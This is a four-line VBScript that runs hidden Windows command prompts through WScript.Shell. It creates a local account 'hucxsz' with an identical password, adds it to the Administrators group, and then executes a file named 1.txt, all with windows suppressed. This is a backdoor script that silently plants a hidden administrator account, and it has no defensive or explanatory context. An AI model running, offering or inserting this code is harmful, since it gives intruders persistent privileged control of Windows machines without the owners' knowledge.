set wshshell=createobject ("wscript.shell") 
a=wshshell.run ("cmd.exe /c net user hucxsz hucxsz /add",0) 
b=wshshell.run ("cmd.exe /c net localgroup Administrators hucxsz /add",0)
b=wshshell.run ("cmd.exe /c 1.txt",0)
